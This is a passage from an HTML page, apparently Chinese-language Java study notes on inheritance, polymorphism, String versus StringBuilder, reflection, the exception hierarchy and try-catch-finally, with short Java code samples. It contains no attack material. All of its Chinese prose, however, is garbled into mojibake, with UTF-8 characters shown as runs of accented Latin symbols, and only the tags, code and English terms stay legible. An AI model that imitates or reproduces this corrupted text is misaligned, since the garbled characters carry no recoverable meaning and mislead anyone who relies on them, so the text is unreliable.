çš„é‡ç”¨ï¼Œç¨‹åºçš„å¯ç»´æŠ¤æ€§ï¼ŒèŠ‚çœå¤§é‡åˆ›å»ºæ–°ç±»çš„æ—¶é—´ ï¼Œæé«˜æˆ‘ä»¬çš„å¼€å‘æ•ˆç‡ã€‚</p>
<p><strong>å…³äºç»§æ‰¿å¦‚ä¸‹ 3 ç‚¹è¯·è®°ä½ï¼š</strong></p>
<ol>
<li>å­ç±»æ‹¥æœ‰çˆ¶ç±»å¯¹è±¡æ‰€æœ‰çš„å±æ€§å’Œæ–¹æ³•ï¼ˆåŒ…æ‹¬ç§æœ‰å±æ€§å’Œç§æœ‰æ–¹æ³•ï¼‰ï¼Œä½†æ˜¯çˆ¶ç±»ä¸­çš„ç§æœ‰å±æ€§å’Œç§æœ‰æ–¹æ³•å­ç±»æ˜¯æ— æ³•è®¿é—®ï¼Œ<strong>åªæ˜¯æ‹¥æœ‰</strong>ã€‚</li>
<li>å­ç±»å¯ä»¥æ‹¥æœ‰è‡ªå·±å±æ€§å’Œæ–¹æ³•ï¼Œå³å­ç±»å¯ä»¥å¯¹çˆ¶ç±»è¿›è¡Œæ‰©å±•ã€‚</li>
<li>å­ç±»å¯ä»¥ç”¨è‡ªå·±çš„æ–¹å¼å®ç°çˆ¶ç±»çš„æ–¹æ³•ã€‚ï¼ˆä»¥åä»‹ç»ï¼‰ã€‚</li>
</ol>
<h4 id="å¤šæ€"><a href="#å¤šæ€" class="headerlink" title="å¤šæ€"></a>å¤šæ€</h4><p>å¤šæ€ï¼Œé¡¾åæ€ä¹‰ï¼Œè¡¨ç¤ºä¸€ä¸ªå¯¹è±¡å…·æœ‰å¤šç§çš„çŠ¶æ€ã€‚å…·ä½“è¡¨ç°ä¸ºçˆ¶ç±»çš„å¼•ç”¨æŒ‡å‘å­ç±»çš„å®ä¾‹ã€‚</p>
<p>å¤šæ€åˆ†ä¸ºç¼–è¯‘æ—¶å¤šæ€å’Œè¿è¡Œæ—¶å¤šæ€ã€‚å…¶ä¸­ç¼–è¯‘æ—¶å¤šæ€æ˜¯é™æ€çš„ï¼Œä¸»è¦æ˜¯æŒ‡æ–¹æ³•çš„é‡è½½ï¼Œå®ƒæ˜¯æ ¹æ®å‚æ•°åˆ—è¡¨çš„ä¸åŒæ¥åŒºåˆ†ä¸åŒçš„å‡½æ•°ï¼Œé€šè¿‡ç¼–è¾‘ä¹‹åä¼šå˜æˆä¸¤ä¸ªä¸åŒçš„å‡½æ•°ï¼Œåœ¨è¿è¡Œæ—¶è°ˆä¸ä¸Šå¤šæ€ã€‚è€Œè¿è¡Œæ—¶å¤šæ€æ˜¯åŠ¨æ€çš„ï¼Œå®ƒæ˜¯é€šè¿‡åŠ¨æ€ç»‘å®šæ¥å®ç°çš„ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬æ‰€è¯´çš„å¤šæ€æ€§ã€‚</p>
<p><strong>å¤šæ€çš„ç‰¹ç‚¹:</strong></p>
<ul>
<li>å¯¹è±¡ç±»å‹å’Œå¼•ç”¨ç±»å‹ä¹‹é—´å…·æœ‰ç»§æ‰¿ï¼ˆç±»ï¼‰&#x2F;å®ç°ï¼ˆæ¥å£ï¼‰çš„å…³ç³»ï¼›</li>
<li>å¼•ç”¨ç±»å‹å˜é‡å‘å‡ºçš„æ–¹æ³•è°ƒç”¨çš„åˆ°åº•æ˜¯å“ªä¸ªç±»ä¸­çš„æ–¹æ³•ï¼Œå¿…é¡»åœ¨ç¨‹åºè¿è¡ŒæœŸé—´æ‰èƒ½ç¡®å®šï¼›</li>
<li>å¤šæ€ä¸èƒ½è°ƒç”¨â€œåªåœ¨å­ç±»å­˜åœ¨ä½†åœ¨çˆ¶ç±»ä¸å­˜åœ¨â€çš„æ–¹æ³•ï¼›</li>
<li>å¦‚æœå­ç±»é‡å†™äº†çˆ¶ç±»çš„æ–¹æ³•ï¼ŒçœŸæ­£æ‰§è¡Œçš„æ˜¯å­ç±»è¦†ç›–çš„æ–¹æ³•ï¼Œå¦‚æœå­ç±»æ²¡æœ‰è¦†ç›–çˆ¶ç±»çš„æ–¹æ³•ï¼Œæ‰§è¡Œçš„æ˜¯çˆ¶ç±»çš„æ–¹æ³•ã€‚</li>
</ul>
<h4 id="åœ¨ä¸€ä¸ªé™æ€æ–¹æ³•å†…è°ƒç”¨ä¸€ä¸ªéé™æ€æˆå‘˜ä¸ºä»€ä¹ˆæ˜¯éæ³•çš„"><a href="#åœ¨ä¸€ä¸ªé™æ€æ–¹æ³•å†…è°ƒç”¨ä¸€ä¸ªéé™æ€æˆå‘˜ä¸ºä»€ä¹ˆæ˜¯éæ³•çš„" class="headerlink" title="åœ¨ä¸€ä¸ªé™æ€æ–¹æ³•å†…è°ƒç”¨ä¸€ä¸ªéé™æ€æˆå‘˜ä¸ºä»€ä¹ˆæ˜¯éæ³•çš„"></a>åœ¨ä¸€ä¸ªé™æ€æ–¹æ³•å†…è°ƒç”¨ä¸€ä¸ªéé™æ€æˆå‘˜ä¸ºä»€ä¹ˆæ˜¯éæ³•çš„</h4><p>ç±»çš„é™æ€æˆå‘˜(å˜é‡æˆ–æ–¹æ³•)å±äºç±»æœ¬èº«ï¼Œåœ¨ç±»åŠ è½½çš„æ—¶å€™å°±ä¼šåˆ†é…å†…å­˜ï¼Œå¯ä»¥é€šè¿‡ç±»åç›´æ¥è®¿é—®<br>éé™æ€æˆå‘˜(å˜é‡æˆ–æ–¹æ³•)å±äºç±»çš„å¯¹è±¡ï¼Œåªæœ‰åœ¨ç±»çš„å¯¹è±¡äº§ç”Ÿ(å®ä¾‹åŒ–)æ—¶æ‰ä¼šåˆ†é…å†…å­˜ï¼Œç„¶åé€šè¿‡ç±»çš„å¯¹è±¡(å®ä¾‹)å»è®¿é—®<br>æ‰€ä»¥ï¼Œå¦‚æœä¸€ä¸ªç±»çš„é™æ€æ–¹æ³•å»è°ƒç”¨éé™æ€æ–¹æ³•æˆ–å˜é‡çš„æ—¶å€™ï¼Œå› ä¸ºç±»çš„é™æ€æ–¹æ³•å­˜åœ¨çš„æ—¶å€™ï¼Œç±»çš„éé™æ€æˆå‘˜å¯èƒ½ä¸å­˜åœ¨ï¼Œè®¿é—®ä¸€ä¸ªå†…å­˜ä¸­ä¸å­˜åœ¨çš„ä¸œè¥¿å½“ç„¶ä¼šå‡ºé”™</p>
<h4 id="String-StringBuffer-å’Œ-StringBuilder"><a href="#String-StringBuffer-å’Œ-StringBuilder" class="headerlink" title="String StringBuffer å’Œ StringBuilder"></a>String StringBuffer å’Œ StringBuilder</h4><p>String s&#x3D;â€œThis is only â€+â€simpleâ€+â€testâ€ä¼šè¢«è™šæ‹Ÿæœºç›´æ¥ä¼˜åŒ–æˆString s&#x3D;â€œThis is only simple testâ€</p>
<p>ç®€å•çš„æ¥è¯´ï¼šString ç±»ä¸­ä½¿ç”¨ final å…³é”®å­—ä¿®é¥°å­—ç¬¦æ•°ç»„æ¥ä¿å­˜å­—ç¬¦ä¸²ï¼Œprivate final char value[]ï¼Œæ‰€ä»¥String å¯¹è±¡æ˜¯ä¸å¯å˜çš„ã€‚</p>
<blockquote>
<p>åœ¨ Java 9 ä¹‹åï¼ŒString ã€StringBuilder ä¸ StringBuffer çš„å®ç°æ”¹ç”¨ byte æ•°ç»„å­˜å‚¨å­—ç¬¦ä¸² private final byte[] value</p>
</blockquote>
<p>è€Œ StringBuilder ä¸ StringBuffer éƒ½ç»§æ‰¿è‡ª AbstractStringBuilder ç±»ï¼Œåœ¨ AbstractStringBuilder ä¸­ä¹Ÿæ˜¯ä½¿ç”¨å­—ç¬¦æ•°ç»„ä¿å­˜å­—ç¬¦ä¸²char[] value ä½†æ˜¯æ²¡æœ‰ç”¨ final å…³é”®å­—ä¿®é¥°ï¼Œæ‰€ä»¥è¿™ä¸¤ç§å¯¹è±¡éƒ½æ˜¯å¯å˜çš„ã€‚</p>
<p>StringBuilder ä¸ StringBuffer çš„æ„é€ æ–¹æ³•éƒ½æ˜¯è°ƒç”¨çˆ¶ç±»æ„é€ æ–¹æ³•ä¹Ÿå°±æ˜¯AbstractStringBuilder å®ç°çš„</p>
<p>String ä¸­çš„å¯¹è±¡æ˜¯ä¸å¯å˜çš„ï¼Œä¹Ÿå°±å¯ä»¥ç†è§£ä¸ºå¸¸é‡ï¼Œçº¿ç¨‹å®‰å…¨ã€‚AbstractStringBuilder æ˜¯ StringBuilder ä¸ StringBuffer çš„å…¬å…±çˆ¶ç±»ï¼Œå®šä¹‰äº†ä¸€äº›å­—ç¬¦ä¸²çš„åŸºæœ¬æ“ä½œï¼Œå¦‚ expandCapacityã€appendã€insertã€indexOf ç­‰å…¬å…±æ–¹æ³•ã€‚StringBuffer å¯¹æ–¹æ³•åŠ äº†åŒæ­¥é”æˆ–è€…å¯¹è°ƒç”¨çš„æ–¹æ³•åŠ äº†åŒæ­¥é”ï¼Œæ‰€ä»¥æ˜¯çº¿ç¨‹å®‰å…¨çš„ã€‚StringBuilder å¹¶æ²¡æœ‰å¯¹æ–¹æ³•è¿›è¡ŒåŠ åŒæ­¥é”ï¼Œæ‰€ä»¥æ˜¯éçº¿ç¨‹å®‰å…¨çš„ã€‚</p>
<p>æ¯æ¬¡å¯¹ String ç±»å‹è¿›è¡Œæ”¹å˜çš„æ—¶å€™ï¼Œéƒ½ä¼šç”Ÿæˆä¸€ä¸ªæ–°çš„ String å¯¹è±¡ï¼Œç„¶åå°†æŒ‡é’ˆæŒ‡å‘æ–°çš„ String å¯¹è±¡ã€‚StringBuffer æ¯æ¬¡éƒ½ä¼šå¯¹ StringBuffer å¯¹è±¡æœ¬èº«è¿›è¡Œæ“ä½œï¼Œè€Œä¸æ˜¯ç”Ÿæˆæ–°çš„å¯¹è±¡å¹¶æ”¹å˜å¯¹è±¡å¼•ç”¨ã€‚ç›¸åŒæƒ…å†µä¸‹ä½¿ç”¨ StringBuilder ç›¸æ¯”ä½¿ç”¨ StringBuffer ä»…èƒ½è·å¾— 10%~15% å·¦å³çš„æ€§èƒ½æå‡ï¼Œä½†å´è¦å†’å¤šçº¿ç¨‹ä¸å®‰å…¨çš„é£é™©ã€‚</p>
<p>å¯¹äºä¸‰è€…ä½¿ç”¨çš„æ€»ç»“ï¼š</p>
<ol>
<li>æ“ä½œå°‘é‡çš„æ•°æ®: é€‚ç”¨ String</li>
<li>å•çº¿ç¨‹æ“ä½œå­—ç¬¦ä¸²ç¼“å†²åŒºä¸‹æ“ä½œå¤§é‡æ•°æ®: é€‚ç”¨ StringBuilder</li>
<li>å¤šçº¿ç¨‹æ“ä½œå­—ç¬¦ä¸²ç¼“å†²åŒºä¸‹æ“ä½œå¤§é‡æ•°æ®: é€‚ç”¨ StringBuffer</li>
</ol>
<h4 id="javaåºåˆ—åŒ–ä¸­å¦‚æœæœ‰äº›å­—æ®µä¸æƒ³è¿›è¡Œåºåˆ—åŒ–-æ€ä¹ˆåŠ"><a href="#javaåºåˆ—åŒ–ä¸­å¦‚æœæœ‰äº›å­—æ®µä¸æƒ³è¿›è¡Œåºåˆ—åŒ–-æ€ä¹ˆåŠ" class="headerlink" title="javaåºåˆ—åŒ–ä¸­å¦‚æœæœ‰äº›å­—æ®µä¸æƒ³è¿›è¡Œåºåˆ—åŒ–,æ€ä¹ˆåŠ?"></a>javaåºåˆ—åŒ–ä¸­å¦‚æœæœ‰äº›å­—æ®µä¸æƒ³è¿›è¡Œåºåˆ—åŒ–,æ€ä¹ˆåŠ?</h4><p>å¯¹äºä¸æƒ³åºåˆ—è¯çš„å˜é‡,ä½¿ç”¨transientå…³é”®å­—ä¿®é¥°</p>
<p>transientå…³é”®å­—çš„ä½œç”¨æ˜¯:é˜»æ­¢å®ä¾‹ä¸­å“ªäº›ç”¨æ­¤å…³é”®å­—ä¿®é¥°çš„å˜é‡åºåˆ—åŒ–;å½“å¯¹è±¡è¢«ååºåˆ—åŒ–æ—¶,è¢«transientä¿®é¥°çš„å˜é‡å€¼ä¸ä¼šè¢«æŒä¹…åŒ–å’Œæ¢å¤; transientåªèƒ½ä¿®é¥°å˜é‡,ä¸èƒ½ä¿®é¥°ç±»å’Œæ–¹æ³•.</p>
<h4 id="è·å–é”®ç›˜è¾“å…¥çš„å¸¸ç”¨æ–¹æ³•"><a href="#è·å–é”®ç›˜è¾“å…¥çš„å¸¸ç”¨æ–¹æ³•" class="headerlink" title="è·å–é”®ç›˜è¾“å…¥çš„å¸¸ç”¨æ–¹æ³•"></a>è·å–é”®ç›˜è¾“å…¥çš„å¸¸ç”¨æ–¹æ³•</h4><p>æ–¹æ³•ä¸€:é€šè¿‡scanner</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Scanner</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line"><span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> input.nextLine();</span><br><span class="line">input.close();</span><br></pre></td></tr></table></figure>

<p>æ–¹æ³•äºŒ: é€šè¿‡BufferedReader</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">BufferedReader</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(System.in));</span><br><span class="line"><span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> input.readLine();</span><br></pre></td></tr></table></figure>

<h4 id="åå°„æœºåˆ¶"><a href="#åå°„æœºåˆ¶" class="headerlink" title="åå°„æœºåˆ¶"></a>åå°„æœºåˆ¶</h4><p>JAVA åå°„æœºåˆ¶æ˜¯åœ¨è¿è¡ŒçŠ¶æ€ä¸­ï¼Œå¯¹äºä»»æ„ä¸€ä¸ªç±»ï¼Œéƒ½èƒ½å¤ŸçŸ¥é“è¿™ä¸ªç±»çš„æ‰€æœ‰å±æ€§å’Œæ–¹æ³•ï¼›å¯¹äºä»»æ„ä¸€ä¸ªå¯¹è±¡ï¼Œéƒ½èƒ½å¤Ÿè°ƒç”¨å®ƒçš„ä»»æ„ä¸€ä¸ªæ–¹æ³•å’Œå±æ€§ï¼›è¿™ç§åŠ¨æ€è·å–çš„ä¿¡æ¯ä»¥åŠåŠ¨æ€è°ƒç”¨å¯¹è±¡çš„æ–¹æ³•çš„åŠŸèƒ½ç§°ä¸º java è¯­è¨€çš„åå°„æœºåˆ¶ã€‚</p>
<p>ä¸€ä¸ªç±»åœ¨å†…å­˜ä¸­åªæœ‰ä¸€ä¸ªclasså¯¹è±¡, ä¸€ä¸ªç±»è¢«åŠ è½½å,ç±»çš„æ•´ä¸ªç»“æ„éƒ½ä¼šå°è£…åœ¨classå¯¹è±¡ä¸­</p>
<h4 id="é™æ€ç¼–è¯‘å’ŒåŠ¨æ€ç¼–è¯‘"><a href="#é™æ€ç¼–è¯‘å’ŒåŠ¨æ€ç¼–è¯‘" class="headerlink" title="é™æ€ç¼–è¯‘å’ŒåŠ¨æ€ç¼–è¯‘"></a>é™æ€ç¼–è¯‘å’ŒåŠ¨æ€ç¼–è¯‘</h4><p>åœ¨ç¼–è¯‘æ—¶ç¡®å®šå¯¹è±¡,ç»‘å®šå¯¹è±¡;</p>
<p>è¿è¡Œæ—¶ç¡®å®šå¯¹è±¡,ç»‘å®šå¯¹è±¡;</p>
<h4 id="åå°„æœºåˆ¶ä¼˜ç¼ºç‚¹"><a href="#åå°„æœºåˆ¶ä¼˜ç¼ºç‚¹" class="headerlink" title="åå°„æœºåˆ¶ä¼˜ç¼ºç‚¹"></a>åå°„æœºåˆ¶ä¼˜ç¼ºç‚¹</h4><p>ä¼˜ç‚¹: è¿è¡ŒæœŸç±»å‹çš„åˆ¤æ–­,åŠ¨æ€åŠ è½½ç±»,æé«˜ä»£ç çµæ´»åº¦</p>
<p>ç¼ºç‚¹: </p>
<p>1.æ€§èƒ½ç“¶é¢ˆ:åå°„ç›¸å½“äºä¸€ç³»åˆ—è§£é‡Šæ“ä½œ,é€šçŸ¥jvmè¦åšçš„äº‹æƒ…,æ€§èƒ½æ¯”ç›´æ¥javaä»£ç è¦æ…¢å¾ˆå¤š.</p>
<p>2.å®‰å…¨é—®é¢˜: è®©æˆ‘ä»¬å¯ä»¥åŠ¨æ€æ“ä½œæ”¹å˜ç±»å±æ€§çš„åŒæ—¶ä¹Ÿå¢åŠ äº†ç±»çš„å®‰å…¨éšæ‚£.</p>
<p>åå°„ä¿®æ”¹stringå€¼,å› ä¸ºfinalæ˜¯ç¼–è¯‘æœŸå…³é”®å­—,åªåœ¨ç¼–è¯‘æœŸè¿›è¡Œæ£€æŸ¥.</p>
<h4 id="åå°„çš„åº”ç”¨åœºæ™¯"><a href="#åå°„çš„åº”ç”¨åœºæ™¯" class="headerlink" title="åå°„çš„åº”ç”¨åœºæ™¯"></a>åå°„çš„åº”ç”¨åœºæ™¯</h4><p>åœ¨æˆ‘ä»¬å¹³æ—¶çš„é¡¹ç›®å¼€å‘è¿‡ç¨‹ä¸­ï¼ŒåŸºæœ¬ä¸Šå¾ˆå°‘ä¼šç›´æ¥ä½¿ç”¨åˆ°åå°„æœºåˆ¶ï¼Œä½†è¿™ä¸èƒ½è¯´æ˜åå°„æœºåˆ¶æ²¡æœ‰ç”¨ï¼Œå®é™…ä¸Šæœ‰å¾ˆå¤šè®¾è®¡ã€å¼€å‘éƒ½ä¸åå°„æœºåˆ¶æœ‰å…³ï¼Œä¾‹å¦‚æ¨¡å—åŒ–çš„å¼€å‘ï¼Œé€šè¿‡åå°„å»è°ƒç”¨å¯¹åº”çš„å­—èŠ‚ç ï¼›åŠ¨æ€ä»£ç†è®¾è®¡æ¨¡å¼ä¹Ÿé‡‡ç”¨äº†åå°„æœºåˆ¶ï¼Œè¿˜æœ‰æˆ‘ä»¬æ—¥å¸¸ä½¿ç”¨çš„ Springï¼Hibernate ç­‰æ¡†æ¶ä¹Ÿå¤§é‡ä½¿ç”¨åˆ°äº†åå°„æœºåˆ¶ã€‚</p>
<p>ä¸¾ä¾‹ï¼š</p>
<ol>
<li>æˆ‘ä»¬åœ¨ä½¿ç”¨ JDBC è¿æ¥æ•°æ®åº“æ—¶ä½¿ç”¨ Class.forName()é€šè¿‡åå°„åŠ è½½æ•°æ®åº“çš„é©±åŠ¨ç¨‹åºï¼›</li>
<li>Spring æ¡†æ¶çš„ IOCï¼ˆåŠ¨æ€åŠ è½½ç®¡ç† Beanï¼‰åˆ›å»ºå¯¹è±¡ä»¥åŠ AOPï¼ˆåŠ¨æ€ä»£ç†ï¼‰åŠŸèƒ½éƒ½å’Œåå°„æœ‰è”ç³»ï¼›</li>
<li>åŠ¨æ€é…ç½®å®ä¾‹çš„å±æ€§ï¼›</li>
</ol>
<h4 id="è·å–classå¯¹è±¡çš„4ç§æ–¹å¼"><a href="#è·å–classå¯¹è±¡çš„4ç§æ–¹å¼" class="headerlink" title="è·å–classå¯¹è±¡çš„4ç§æ–¹å¼"></a>è·å–classå¯¹è±¡çš„4ç§æ–¹å¼</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// é€šè¿‡æ­¤æ–¹æ³•è·å–Classå¯¹è±¡ä¸ä¼šè¿›è¡Œåˆå§‹åŒ–</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">string</span> <span class="operator">=</span> String.class;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Class.forName(className)æ–¹æ³•ï¼Œå†…éƒ¨å®é™…è°ƒç”¨çš„æ˜¯ä¸€ä¸ªnativeæ–¹æ³• forName0(className, true, ClassLoader.getClassLoader(caller), caller);</span></span><br><span class="line"><span class="comment">//ç¬¬2ä¸ªbooleanå‚æ•°è¡¨ç¤ºç±»æ˜¯å¦éœ€è¦åˆå§‹åŒ–ï¼ŒClass.forName(className)é»˜è®¤æ˜¯éœ€è¦åˆå§‹åŒ–ã€‚</span></span><br><span class="line"><span class="comment">//ä¸€æ—¦åˆå§‹åŒ–ï¼Œå°±ä¼šè§¦å‘ç›®æ ‡å¯¹è±¡çš„ staticå—ä»£ç æ‰§è¡Œï¼Œstaticå‚æ•°ä¹Ÿä¼šè¢«å†æ¬¡åˆå§‹åŒ–ã€‚</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">alunbarClass1</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;cn.javaguide.TargetObject&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//é€šè¿‡å¯¹è±¡è·å–</span></span><br><span class="line"><span class="type">Employee</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Employee</span>();</span><br><span class="line"><span class="type">Class</span> <span class="variable">alunbarClass2</span> <span class="operator">=</span> e.getClass();</span><br><span class="line"></span><br><span class="line"><span class="comment">// è¿™ç§æ–¹å¼åŠ è½½çš„ä¸ä¼šåˆå§‹åŒ–</span></span><br><span class="line"><span class="type">ClassLoader</span> <span class="variable">systemClassLoader</span> <span class="operator">=</span> ClassLoader.getSystemClassLoader();</span><br><span class="line">        Class&lt;?&gt; aClass1 = systemClassLoader.loadClass(<span class="string">&quot;java.lang.String&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// åŸºæœ¬å†…ç½®ç±»å‹çš„åŒ…è£…ç±»éƒ½æœ‰ä¸€ä¸ªTypeå±æ€§</span></span><br><span class="line">Class&lt;Integer&gt; type = Integer.TYPE;</span><br><span class="line"></span><br><span class="line"><span class="comment">// è·å¾—çˆ¶ç±»çš„class</span></span><br><span class="line">a.getSuperClass()</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h4 id="å¼‚å¸¸ç±»å±‚æ¬¡ç»“æ„å›¾"><a href="#å¼‚å¸¸ç±»å±‚æ¬¡ç»“æ„å›¾" class="headerlink" title="å¼‚å¸¸ç±»å±‚æ¬¡ç»“æ„å›¾"></a>å¼‚å¸¸ç±»å±‚æ¬¡ç»“æ„å›¾</h4><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848033.png" alt="img"></p>
<p>åœ¨ Java ä¸­ï¼Œæ‰€æœ‰çš„å¼‚å¸¸éƒ½æœ‰ä¸€ä¸ªå…±åŒçš„ç¥–å…ˆ java.lang åŒ…ä¸­çš„ Throwable ç±»ã€‚Throwable ç±»æœ‰ä¸¤ä¸ªé‡è¦çš„å­ç±» Exceptionï¼ˆå¼‚å¸¸ï¼‰å’Œ Errorï¼ˆé”™è¯¯ï¼‰ã€‚Exception èƒ½è¢«ç¨‹åºæœ¬èº«å¤„ç†(try-catch)ï¼Œ Error æ˜¯æ— æ³•å¤„ç†çš„(åªèƒ½å°½é‡é¿å…)ã€‚</p>
<ul>
<li>Exception : ç¨‹åºæœ¬èº«å¯ä»¥å¤„ç†çš„å¼‚å¸¸ï¼Œå¯ä»¥é€šè¿‡ catch æ¥è¿›è¡Œæ•è·ã€‚Exception åˆå¯ä»¥åˆ†ä¸º å—æ£€æŸ¥å¼‚å¸¸(å¿…é¡»å¤„ç†, ä¸ç„¶ç¼–è¯‘ä¼šæŠ¥é”™) å’Œ ä¸å—æ£€æŸ¥å¼‚å¸¸(å¯ä»¥ä¸å¤„ç†)ã€‚</li>
<li>Error ï¼šError å±äºç¨‹åºæ— æ³•å¤„ç†çš„é”™è¯¯ ï¼Œæˆ‘ä»¬æ²¡åŠæ³•é€šè¿‡ catch æ¥è¿›è¡Œæ•è· ã€‚ä¾‹å¦‚ï¼ŒJava è™šæ‹Ÿæœºè¿è¡Œé”™è¯¯ï¼ˆVirtual MachineErrorï¼‰ã€è™šæ‹Ÿæœºå†…å­˜ä¸å¤Ÿé”™è¯¯(OutOfMemoryError)ã€ç±»å®šä¹‰é”™è¯¯ï¼ˆNoClassDefFoundErrorï¼‰ç­‰ ã€‚è¿™äº›å¼‚å¸¸å‘ç”Ÿæ—¶ï¼ŒJava è™šæ‹Ÿæœºï¼ˆJVMï¼‰ä¸€èˆ¬ä¼šé€‰æ‹©çº¿ç¨‹ç»ˆæ­¢ã€‚</li>
</ul>
<p><strong>å—æ£€å¼‚å¸¸</strong></p>
<p>é™¤äº†RuntimeExceptionåŠå…¶å­ç±»ä»¥å¤–ï¼Œå…¶ä»–çš„Exceptionç±»åŠå…¶å­ç±»éƒ½å±äºå—æ£€æŸ¥å¼‚å¸¸ ã€‚å¸¸è§çš„å—æ£€æŸ¥å¼‚å¸¸æœ‰ï¼š IO ç›¸å…³çš„å¼‚å¸¸ã€ClassNotFoundException ã€SQLExceptionâ€¦ã€‚</p>
<p><strong>ä¸å—æ£€å¼‚å¸¸</strong></p>
<p>Java ä»£ç åœ¨ç¼–è¯‘è¿‡ç¨‹ä¸­ ï¼Œæˆ‘ä»¬å³ä½¿ä¸å¤„ç†ä¸å—æ£€æŸ¥å¼‚å¸¸ä¹Ÿå¯ä»¥æ­£å¸¸é€šè¿‡ç¼–è¯‘ã€‚</p>
<p>RuntimeException åŠå…¶å­ç±»éƒ½ç»Ÿç§°ä¸ºéå—æ£€æŸ¥å¼‚å¸¸ï¼Œä¾‹å¦‚ï¼šNullPointerExceptionã€NumberFormatExceptionï¼ˆå­—ç¬¦ä¸²è½¬æ¢ä¸ºæ•°å­—ï¼‰ã€ArrayIndexOutOfBoundsExceptionï¼ˆæ•°ç»„è¶Šç•Œï¼‰ã€ClassCastExceptionï¼ˆç±»å‹è½¬æ¢é”™è¯¯ï¼‰ã€ArithmeticExceptionï¼ˆç®—æœ¯é”™è¯¯ï¼‰ç­‰ã€‚</p>
<h4 id="Throwableç±»å¸¸ç”¨æ–¹æ³•"><a href="#Throwableç±»å¸¸ç”¨æ–¹æ³•" class="headerlink" title="Throwableç±»å¸¸ç”¨æ–¹æ³•"></a>Throwableç±»å¸¸ç”¨æ–¹æ³•</h4><ul>
<li>public string getMessage():è¿”å›å¼‚å¸¸å‘ç”Ÿæ—¶çš„ç®€è¦æè¿°</li>
<li>public string toString():è¿”å›å¼‚å¸¸å‘ç”Ÿæ—¶çš„è¯¦ç»†ä¿¡æ¯</li>
<li>public string getLocalizedMessage():è¿”å›å¼‚å¸¸å¯¹è±¡çš„æœ¬åœ°åŒ–ä¿¡æ¯ã€‚ä½¿ç”¨ Throwable çš„å­ç±»è¦†ç›–è¿™ä¸ªæ–¹æ³•ï¼Œå¯ä»¥ç”Ÿæˆæœ¬åœ°åŒ–ä¿¡æ¯ã€‚å¦‚æœå­ç±»æ²¡æœ‰è¦†ç›–è¯¥æ–¹æ³•ï¼Œåˆ™è¯¥æ–¹æ³•è¿”å›çš„ä¿¡æ¯ä¸ getMessageï¼ˆï¼‰è¿”å›çš„ç»“æœç›¸åŒ</li>
<li>public void printStackTrace():åœ¨æ§åˆ¶å°ä¸Šæ‰“å° Throwable å¯¹è±¡å°è£…çš„å¼‚å¸¸ä¿¡æ¯</li>
</ul>
<h4 id="try-catch-finally"><a href="#try-catch-finally" class="headerlink" title="try-catch-finally"></a>try-catch-finally</h4><ul>
<li>tryå—ï¼š ç”¨äºæ•è·å¼‚å¸¸ã€‚å…¶åå¯æ¥é›¶ä¸ªæˆ–å¤šä¸ª catch å—ï¼Œå¦‚æœæ²¡æœ‰ catch å—ï¼Œåˆ™å¿…é¡»è·Ÿä¸€ä¸ª finally å—ã€‚</li>
<li>catchå—ï¼š ç”¨äºå¤„ç† try æ•è·åˆ°çš„å¼‚å¸¸ã€‚</li>
<li>finally å—ï¼š æ— è®ºæ˜¯å¦æ•è·æˆ–å¤„ç†å¼‚å¸¸ï¼Œfinally å—é‡Œçš„è¯­å¥éƒ½ä¼šè¢«æ‰§è¡Œã€‚å½“åœ¨ try å—æˆ– catchå—ä¸­é‡åˆ° return è¯­å¥æ—¶ï¼Œfinally è¯­å¥å—å°†åœ¨æ–¹æ³•è¿”å›ä¹‹å‰è¢«æ‰§è¡Œã€‚</li>
</ul>
<p>åœ¨ä»¥ä¸‹ 3 ç§ç‰¹æ®Šæƒ…å†µä¸‹,finallyå—ä¸ä¼šè¢«æ‰§è¡Œï¼š</p>
<ol>
<li>åœ¨ try æˆ– finallyå—ä¸­ç”¨äº† System.exit(int)é€€å‡ºç¨‹åºã€‚ä½†æ˜¯ï¼Œå¦‚æœ System.exit(int) åœ¨å¼‚å¸¸è¯­å¥ä¹‹åï¼Œfinally è¿˜æ˜¯ä¼šè¢«æ‰§è¡Œ</li>
<li>ç¨‹åºæ‰€åœ¨çš„çº¿ç¨‹æ­»äº¡ã€‚</li>
<li>å…³é—­ CPUã€‚</li>
</ol>
<p><strong>æ³¨æ„ï¼š</strong> å½“ try è¯­å¥å’Œ finally è¯­å¥ä¸­éƒ½æœ‰ return è¯­å¥æ—¶ï¼Œåœ¨æ–¹æ³•è¿”å›ä¹‹å‰ï¼Œfinally è¯­å¥çš„å†…å®¹å°†è¢«æ‰§è¡Œï¼Œå¹¶ä¸” finally è¯­å¥çš„è¿”å›å€¼å°†ä¼šè¦†ç›–åŸå§‹çš„è¿”å›å€¼ã€‚å¦‚ä¸‹ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">f</span><span class="params">(<span class="type">int</span> value)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> value * value;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (value == <span class="number">2</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span 